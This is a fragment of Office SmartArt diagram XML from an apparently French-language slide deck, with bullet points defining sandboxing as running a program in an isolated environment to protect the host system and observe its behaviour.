      <dgm:prSet presAssocID="{541595E2-88E5-4909-98F3-1BE2FEFE43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arrow"/>
        </a:ext>
      </dgm:extLst>
    </dgm:pt>
    <dgm:pt modelId="{B8251E2B-C9C6-48A8-85AE-446DE79AD358}" type="pres">
      <dgm:prSet presAssocID="{541595E2-88E5-4909-98F3-1BE2FEFE43C3}" presName="spaceRect" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{FFE849AC-C0CF-4CE5-A83B-7CB5DA0277FC}" type="pres">
      <dgm:prSet presAssocID="{541595E2-88E5-4909-98F3-1BE2FEFE43C3}" presName="parTx" presStyleLbl="revTx" presStyleIdx="0" presStyleCnt="8">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:chPref val="0"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{FC557352-8EB6-4A8F-9BB2-35CE511E6A4B}" type="pres">
      <dgm:prSet presAssocID="{541595E2-88E5-4909-98F3-1BE2FEFE43C3}" presName="desTx" presStyleLbl="revTx" presStyleIdx="1" presStyleCnt="8">
        <dgm:presLayoutVars/>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{9E7D2307-91BB-4F74-804D-7A109F0BA3D7}" type="pres">
      <dgm:prSet presAssocID="{DB70E9D5-8014-44C7-9014-52ED1354D0A2}" presName="sibTrans" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{F7620B47-05B9-4A64-B705-ABF2A478578E}" type="pres">
      <dgm:prSet presAssocID="{F0BF7BF3-AC50-45A5-B53C-08D95DA2B71A}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{DBC49395-2DDF-4948-A90C-53C9AFEAA835}" type="pres">
      <dgm:prSet presAssocID="{F0BF7BF3-AC50-45A5-B53C-08D95DA2B71A}" presName="bgRect" presStyleLbl="bgShp" presStyleIdx="1" presStyleCnt="4"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{81E99BAC-F0EE-4D55-A9F9-4EDB88289205}" type="pres">
      <dgm:prSet presAssocID="{F0BF7BF3-AC50-45A5-B53C-08D95DA2B71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78FE62E-58DB-4734-8C30-3F35ED8C52F2}" type="pres">
      <dgm:prSet presAssocID="{F0BF7BF3-AC50-45A5-B53C-08D95DA2B71A}" presName="spaceRect" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{C9AC973D-EFA4-4E94-9A39-9F2371E109E3}" type="pres">
      <dgm:prSet presAssocID="{F0BF7BF3-AC50-45A5-B53C-08D95DA2B71A}" presName="parTx" presStyleLbl="revTx" presStyleIdx="2" presStyleCnt="8">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:chPref val="0"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B7A2A0AE-78D5-4D09-8D0A-0BC04B8B7380}" type="pres">
      <dgm:prSet presAssocID="{F0BF7BF3-AC50-45A5-B53C-08D95DA2B71A}" presName="desTx" presStyleLbl="revTx" presStyleIdx="3" presStyleCnt="8">
        <dgm:presLayoutVars/>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{5CA71836-CDD1-4AC6-95D8-A241FFF11BAB}" type="pres">
      <dgm:prSet presAssocID="{2F045F1C-D8B3-4F91-959A-3C5AA632257B}" presName="sibTrans" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{65460E54-73EB-42FA-A23F-8DD9D507D38F}" type="pres">
      <dgm:prSet presAssocID="{E0276E7A-1967-403B-91A3-5B96C8E7743A}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{C28C0C08-81C3-4445-9165-F6FDDFEBF58F}" type="pres">
      <dgm:prSet presAssocID="{E0276E7A-1967-403B-91A3-5B96C8E7743A}" presName="bgRect" presStyleLbl="bgShp" presStyleIdx="2" presStyleCnt="4"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{D666532A-AD73-46E9-B51B-22A8529BC7C2}" type="pres">
      <dgm:prSet presAssocID="{E0276E7A-1967-403B-91A3-5B96C8E7743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0BD47CE-95A7-4973-AD24-A0FC3C76BDCB}" type="pres">
      <dgm:prSet presAssocID="{E0276E7A-1967-403B-91A3-5B96C8E7743A}" presName="spaceRect" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{3BD69E90-A6E7-4D11-8D31-D75FAF9BE2AA}" type="pres">
      <dgm:prSet presAssocID="{E0276E7A-1967-403B-91A3-5B96C8E7743A}" presName="parTx" presStyleLbl="revTx" presStyleIdx="4" presStyleCnt="8">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:chPref val="0"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{0EE8A610-5B51-4745-96D6-A8809083FC15}" type="pres">
      <dgm:prSet presAssocID="{E0276E7A-1967-403B-91A3-5B96C8E7743A}" presName="desTx" presStyleLbl="revTx" presStyleIdx="5" presStyleCnt="8">
        <dgm:presLayoutVars/>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{21548319-EE12-46D6-B905-F6225F91316D}" type="pres">
      <dgm:prSet presAssocID="{975B5C1E-4F08-40CE-80C4-4F55A7B12237}" presName="sibTrans" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{4922F803-58FD-48A7-A624-363EFA622FFA}" type="pres">
      <dgm:prSet presAssocID="{6ACC5182-5E00-44C5-917F-E76EAC49B9A9}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{460600BD-FB8B-4C3D-95AE-2D59A7361881}" type="pres">
      <dgm:prSet presAssocID="{6ACC5182-5E00-44C5-917F-E76EAC49B9A9}" presName="bgRect" presStyleLbl="bgShp" presStyleIdx="3" presStyleCnt="4"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E99265FF-8762-4B1F-9EB3-7A7223673200}" type="pres">
      <dgm:prSet presAssocID="{6ACC5182-5E00-44C5-917F-E76EAC49B9A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408CDF00-DF6C-4A97-8BB3-C4689AE5467B}" type="pres">
      <dgm:prSet presAssocID="{6ACC5182-5E00-44C5-917F-E76EAC49B9A9}" presName="spaceRect" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{EF3CC0A3-CBAD-4447-A54D-87731C0898D0}" type="pres">
      <dgm:prSet presAssocID="{6ACC5182-5E00-44C5-917F-E76EAC49B9A9}" presName="parTx" presStyleLbl="revTx" presStyleIdx="6" presStyleCnt="8">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:chPref val="0"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{99E0A5F1-7337-48E9-932F-C493C90AAA4A}" type="pres">
      <dgm:prSet presAssocID="{6ACC5182-5E00-44C5-917F-E76EAC49B9A9}" presName="desTx" presStyleLbl="revTx" presStyleIdx="7" presStyleCnt="8">
        <dgm:presLayoutVars/>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{BDD3AF36-9137-49FA-A7EB-60783093E594}" type="presOf" srcId="{541595E2-88E5-4909-98F3-1BE2FEFE43C3}" destId="{FFE849AC-C0CF-4CE5-A83B-7CB5DA0277FC}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{A06BA539-2849-47EF-BE58-839FB381F18B}" srcId="{19C3D7E1-EC38-491F-A1A5-1135FB7DE272}" destId="{E0276E7A-1967-403B-91A3-5B96C8E7743A}" srcOrd="2" destOrd="0" parTransId="{9D6A0A3B-17E1-404A-9687-562A027194C0}" sibTransId="{975B5C1E-4F08-40CE-80C4-4F55A7B12237}"/>
    <dgm:cxn modelId="{37B56846-10E1-4C48-92AB-C73417479A8B}" type="presOf" srcId="{F0BF7BF3-AC50-45A5-B53C-08D95DA2B71A}" destId="{C9AC973D-EFA4-4E94-9A39-9F2371E109E3}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{2656FE4C-7752-4A1F-B97A-7091259BA6B6}" srcId="{E0276E7A-1967-403B-91A3-5B96C8E7743A}" destId="{A9A8261B-BEB2-45C3-94B5-54CBC5D31C14}" srcOrd="0" destOrd="0" parTransId="{14A4D619-E7B8-4D47-970D-AF58BDD5D7E5}" sibTransId="{52EEC713-96CA-42F7-95AF-26065737CA2A}"/>
    <dgm:cxn modelId="{1895EA8B-53BC-42C8-82C8-F7EC0A90E18F}" srcId="{19C3D7E1-EC38-491F-A1A5-1135FB7DE272}" destId="{541595E2-88E5-4909-98F3-1BE2FEFE43C3}" srcOrd="0" destOrd="0" parTransId="{96BE5FA3-1C48-470D-9560-908860F0BF09}" sibTransId="{DB70E9D5-8014-44C7-9014-52ED1354D0A2}"/>
    <dgm:cxn modelId="{E734729E-C153-4402-BFB3-79084B156DF5}" type="presOf" srcId="{6ACC5182-5E00-44C5-917F-E76EAC49B9A9}" destId="{EF3CC0A3-CBAD-4447-A54D-87731C0898D0}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{DA3FCF9F-683A-495B-B13F-31E8D15419EB}" srcId="{19C3D7E1-EC38-491F-A1A5-1135FB7DE272}" destId="{F0BF7BF3-AC50-45A5-B53C-08D95DA2B71A}" srcOrd="1" destOrd="0" parTransId="{43E6F85F-8C93-4A45-94CC-94379FDD18FC}" sibTransId="{2F045F1C-D8B3-4F91-959A-3C5AA632257B}"/>
    <dgm:cxn modelId="{D6CF7FA3-B848-42A6-AC4B-D2CD25695A81}" srcId="{F0BF7BF3-AC50-45A5-B53C-08D95DA2B71A}" destId="{DE9C3587-2BD2-4BF3-A263-532226485BED}" srcOrd="0" destOrd="0" parTransId="{365CBDDB-9AB0-4112-88DD-8AE23BBDD2A3}" sibTransId="{4866B956-6C75-40ED-883D-08C3EB1E7C29}"/>
    <dgm:cxn modelId="{D30BF1AB-13A9-45AF-ABF7-5B6264D9B831}" type="presOf" srcId="{75227F56-EDEE-422B-A757-DEF5D9D8B335}" destId="{FC557352-8EB6-4A8F-9BB2-35CE511E6A4B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{8EC8B9C5-D372-4E10-AE5E-40D9216C9044}" srcId="{19C3D7E1-EC38-491F-A1A5-1135FB7DE272}" destId="{6ACC5182-5E00-44C5-917F-E76EAC49B9A9}" srcOrd="3" destOrd="0" parTransId="{57CE0A64-D181-446A-9131-35C8E8EE8F06}" sibTransId="{74623812-58EF-4E3F-95FA-6493A2E6A759}"/>
    <dgm:cxn modelId="{A96792CD-C6B8-4286-AA48-7E0F206AC058}" type="presOf" srcId="{A9A8261B-BEB2-45C3-94B5-54CBC5D31C14}" destId="{0EE8A610-5B51-4745-96D6-A8809083FC15}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{27FFD0CE-AAC8-47FC-A727-EAD6822D668A}" type="presOf" srcId="{19C3D7E1-EC38-491F-A1A5-1135FB7DE272}" destId="{4B1DA917-67A4-40C5-B64E-91AB59C4C2FE}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{CD3AC8D7-A3E8-488C-B6A2-25932A6212AD}" type="presOf" srcId="{DE9C3587-2BD2-4BF3-A263-532226485BED}" destId="{B7A2A0AE-78D5-4D09-8D0A-0BC04B8B7380}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{AA4848D8-28A1-4A4E-8EFF-8D2CD6A60F08}" type="presOf" srcId="{E0276E7A-1967-403B-91A3-5B96C8E7743A}" destId="{3BD69E90-A6E7-4D11-8D31-D75FAF9BE2AA}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{1DAB5BE2-2090-41F6-93FF-D447C48C2CB5}" srcId="{6ACC5182-5E00-44C5-917F-E76EAC49B9A9}" destId="{520D6BA7-82E6-4E2F-AB0C-77D9C7B2ACE2}" srcOrd="0" destOrd="0" parTransId="{16C87DD0-99E3-4409-BF24-709F75E9C62E}" sibTransId="{334BA92B-E837-4112-97CE-3C8EA46FBBDA}"/>
    <dgm:cxn modelId="{3BAC08EA-24C1-49AF-A308-43FB785D3012}" type="presOf" srcId="{520D6BA7-82E6-4E2F-AB0C-77D9C7B2ACE2}" destId="{99E0A5F1-7337-48E9-932F-C493C90AAA4A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{9CA1B0FC-2BAA-4C3A-805B-9BF9C67D19D8}" srcId="{541595E2-88E5-4909-98F3-1BE2FEFE43C3}" destId="{75227F56-EDEE-422B-A757-DEF5D9D8B335}" srcOrd="0" destOrd="0" parTransId="{F24005CA-43E8-40BA-9050-BD276339D76F}" sibTransId="{015D0EDF-D020-4067-9176-2D514CEBE16C}"/>
    <dgm:cxn modelId="{561B2A9D-5D6B-48F0-A47B-55BA8479C32A}" type="presParOf" srcId="{4B1DA917-67A4-40C5-B64E-91AB59C4C2FE}" destId="{802DDD53-DEA4-40D2-B406-C5C1C9BF7B20}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{88D00F57-63B9-4C2E-8B88-D4DF4527154B}" type="presParOf" srcId="{802DDD53-DEA4-40D2-B406-C5C1C9BF7B20}" destId="{C0FD2ABA-818C-42EC-9A95-B85052F9255F}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{0C099155-8FCA-4682-98C7-87BE33AC1679}" type="presParOf" srcId="{802DDD53-DEA4-40D2-B406-C5C1C9BF7B20}" destId="{86975C23-2F57-4A90-B0BE-B30D9858D421}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{73706BE5-CAAD-4F3A-8857-D1E606226591}" type="presParOf" srcId="{802DDD53-DEA4-40D2-B406-C5C1C9BF7B20}" destId="{B8251E2B-C9C6-48A8-85AE-446DE79AD358}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{87B8213F-B633-4BFF-89B4-28C367F64B21}" type="presParOf" srcId="{802DDD53-DEA4-40D2-B406-C5C1C9BF7B20}" destId="{FFE849AC-C0CF-4CE5-A83B-7CB5DA0277FC}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{1971F950-B34F-47E2-8E6C-AE2CFCF57D28}" type="presParOf" srcId="{802DDD53-DEA4-40D2-B406-C5C1C9BF7B20}" destId="{FC557352-8EB6-4A8F-9BB2-35CE511E6A4B}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{4FE8F721-F72B-4ACE-A2DB-276C29487302}" type="presParOf" srcId="{4B1DA917-67A4-40C5-B64E-91AB59C4C2FE}" destId="{9E7D2307-91BB-4F74-804D-7A109F0BA3D7}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{958B278B-1487-42EE-BF41-ADECCEBA270C}" type="presParOf" srcId="{4B1DA917-67A4-40C5-B64E-91AB59C4C2FE}" destId="{F7620B47-05B9-4A64-B705-ABF2A478578E}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{433B433A-E39B-4982-9F7B-39156F24FCCB}" type="presParOf" srcId="{F7620B47-05B9-4A64-B705-ABF2A478578E}" destId="{DBC49395-2DDF-4948-A90C-53C9AFEAA835}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{45472C9F-525E-4D18-9B55-BFBAB9834404}" type="presParOf" srcId="{F7620B47-05B9-4A64-B705-ABF2A478578E}" destId="{81E99BAC-F0EE-4D55-A9F9-4EDB88289205}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{9A6D8E83-3A4F-4B82-B6CF-4F7B764A6337}" type="presParOf" srcId="{F7620B47-05B9-4A64-B705-ABF2A478578E}" destId="{B78FE62E-58DB-4734-8C30-3F35ED8C52F2}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{DE1BC3F2-C3F0-445E-A814-75A8337568C1}" type="presParOf" srcId="{F7620B47-05B9-4A64-B705-ABF2A478578E}" destId="{C9AC973D-EFA4-4E94-9A39-9F2371E109E3}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{E8EF3CE2-0DE2-4135-BAD1-059D2F6FFDC7}" type="presParOf" srcId="{F7620B47-05B9-4A64-B705-ABF2A478578E}" destId="{B7A2A0AE-78D5-4D09-8D0A-0BC04B8B7380}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{4D5B3489-B255-4CCA-B034-3A5A70668603}" type="presParOf" srcId="{4B1DA917-67A4-40C5-B64E-91AB59C4C2FE}" destId="{5CA71836-CDD1-4AC6-95D8-A241FFF11BAB}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{E7E5064B-0A04-45A8-8CF8-BF62C66A0A18}" type="presParOf" srcId="{4B1DA917-67A4-40C5-B64E-91AB59C4C2FE}" destId="{65460E54-73EB-42FA-A23F-8DD9D507D38F}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{7BACEAF4-5395-4CE1-A230-768EA8B13D06}" type="presParOf" srcId="{65460E54-73EB-42FA-A23F-8DD9D507D38F}" destId="{C28C0C08-81C3-4445-9165-F6FDDFEBF58F}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{CA7F9BB7-598E-4B13-A8CE-2FA4001CDD14}" type="presParOf" srcId="{65460E54-73EB-42FA-A23F-8DD9D507D38F}" destId="{D666532A-AD73-46E9-B51B-22A8529BC7C2}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{50AD5D93-298B-4D1C-9E31-29A85DE5E54B}" type="presParOf" srcId="{65460E54-73EB-42FA-A23F-8DD9D507D38F}" destId="{C0BD47CE-95A7-4973-AD24-A0FC3C76BDCB}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{D36CBBB0-829B-434E-8517-2084E9A6A393}" type="presParOf" srcId="{65460E54-73EB-42FA-A23F-8DD9D507D38F}" destId="{3BD69E90-A6E7-4D11-8D31-D75FAF9BE2AA}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{5A8A4CD9-1FEC-4B90-8E4C-5F6B0A41DBE2}" type="presParOf" srcId="{65460E54-73EB-42FA-A23F-8DD9D507D38F}" destId="{0EE8A610-5B51-4745-96D6-A8809083FC15}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{C384CF3D-B6A3-4366-8BF2-DFA9FAD3E345}" type="presParOf" srcId="{4B1DA917-67A4-40C5-B64E-91AB59C4C2FE}" destId="{21548319-EE12-46D6-B905-F6225F91316D}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{FA38A756-76A9-47C9-90EA-DBEB57E76701}" type="presParOf" srcId="{4B1DA917-67A4-40C5-B64E-91AB59C4C2FE}" destId="{4922F803-58FD-48A7-A624-363EFA622FFA}" srcOrd="6" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{51E3EF97-2499-44BA-A8D7-2F7651C8EE3D}" type="presParOf" srcId="{4922F803-58FD-48A7-A624-363EFA622FFA}" destId="{460600BD-FB8B-4C3D-95AE-2D59A7361881}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{AFD48042-200B-475B-A8EB-E679F9A3C50E}" type="presParOf" srcId="{4922F803-58FD-48A7-A624-363EFA622FFA}" destId="{E99265FF-8762-4B1F-9EB3-7A7223673200}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{05D75483-9183-4491-BFD5-60436BAB573C}" type="presParOf" srcId="{4922F803-58FD-48A7-A624-363EFA622FFA}" destId="{408CDF00-DF6C-4A97-8BB3-C4689AE5467B}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{CBB803A5-735F-4781-88FF-66F15A12BE83}" type="presParOf" srcId="{4922F803-58FD-48A7-A624-363EFA622FFA}" destId="{EF3CC0A3-CBAD-4447-A54D-87731C0898D0}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{58B8BD82-7DB5-48E5-838C-B7D177D9CC64}" type="presParOf" srcId="{4922F803-58FD-48A7-A624-363EFA622FFA}" destId="{99E0A5F1-7337-48E9-932F-C493C90AAA4A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2AA7FE43-9694-405E-923E-F5053B42D7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3A6AD8D-1EEA-42E3-89F2-CE9850E54D53}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Principe :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C3B36F74-7AED-4AF0-879D-EA6724615319}" type="parTrans" cxnId="{C874F922-90F0-43A3-B891-6D2712DAB985}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{38D38471-4544-4891-8AB7-50D8C93D1F42}" type="sibTrans" cxnId="{C874F922-90F0-43A3-B891-6D2712DAB985}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5B6E02F3-006F-4B72-B199-462EA1B87F54}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Exécuter un programme dans un environnement isolé.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{348EF990-49D3-4D34-AC9F-78086CFB5B61}" type="parTrans" cxnId="{3365A219-D16D-4A94-81BA-A7FA80A96F82}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2C4F74B1-C6C2-48CA-91ED-9252B033AC9C}" type="sibTrans" cxnId="{3365A219-D16D-4A94-81BA-A7FA80A96F82}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C8649DE8-5AD8-48FF-A969-C8E41717BE5B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Objectifs :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{69FD5FA6-E159-40B1-897B-35101971F416}" type="parTrans" cxnId="{2D4CADB1-4692-43DA-A01C-08669DB21584}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E7091D64-9166-484D-A0AE-612997655E6D}" type="sibTrans" cxnId="{2D4CADB1-4692-43DA-A01C-08669DB21584}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2841CA77-CC39-4022-BC60-828D7A4A3C87}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Prévenir les dommages au système hôte.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6FAB0FFE-8648-4A3B-97AE-41D58B9C2A55}" type="parTrans" cxnId="{984B9F63-33A5-4533-8FCA-FC5054D06ECB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7BD99095-B30C-4DC4-AF90-6C5F6D64C706}" type="sibTrans" cxnId="{984B9F63-33A5-4533-8FCA-FC5054D06ECB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B4919BC3-CDB9-45BC-8C75-22138DBDD055}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Observer le comportement sans interférences.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{EC7956AA-1847-4229-97C8-8390BFA1B7CE}" type="parTrans" cxnId="{DE0396F1-08BF-4417-BF8E-37057758C170}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9C037578-E1AE-46DE-900B-9E41B7BA15D5}" type="sibTrans" cxnId="{DE0396F1-08BF-4417-BF8E-37057758C170}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C4C50E3D-0EEA-47CB-8483-14DC7474DAE9}" type="pres">
      <dgm:prSet presAssocID="{2AA7FE43-9694-405E-923E-F5053B42D750}" presName="root" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7E1A8A4F-03E6-42F8-85F8-7953E43ED184}" type="pres">
      <dgm:prSet presAssocID="{A3A6AD8D-1EEA-42E3-89F2-CE9850E54D53}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
